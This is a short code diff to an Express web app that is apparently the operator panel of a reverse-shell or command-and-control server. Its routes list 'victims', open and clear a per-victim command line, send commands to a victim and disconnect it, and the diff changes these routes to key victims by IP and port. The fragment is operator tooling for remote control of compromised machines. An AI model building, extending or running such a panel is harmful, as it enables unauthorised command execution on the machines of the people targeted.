@@ -19,20 +19,20 @@ app.get('/', TCPserver.getVictims, function (req, res) {
     }
 })
 
-app.get('/:ip', TCPserver.getCommandLine, function (req, res) {
+app.get('/:ip/:port', TCPserver.getCommandLine, function (req, res) {
     res.render('victim.html', { victim: req.victim });
 })
 
-app.post('/:ip', TCPserver.send, function (req, res) {
+app.post('/:ip/:port', TCPserver.send, function (req, res) {
     res.render('victim.html', { victim: req.victim });
 })
 
-app.post('/:ip/disconnect', TCPserver.disconnect, function(req, res){ 
+app.post('/:ip/:port/disconnect', TCPserver.disconnect, function(req, res){ 
     res.redirect(303, '/');
 })
 
-app.post('/:ip/clear', TCPserver.clearCommandLine, function(req, res){ 
-    res.redirect(303, '/' + req.params.ip);
+app.post('/:ip/:port/clear', TCPserver.clearCommandLine, function(req, res){ 
+    res.redirect(303, '/' + req.params.ip + '/' + req.params.port);
 })
 
 app.listen(8080);
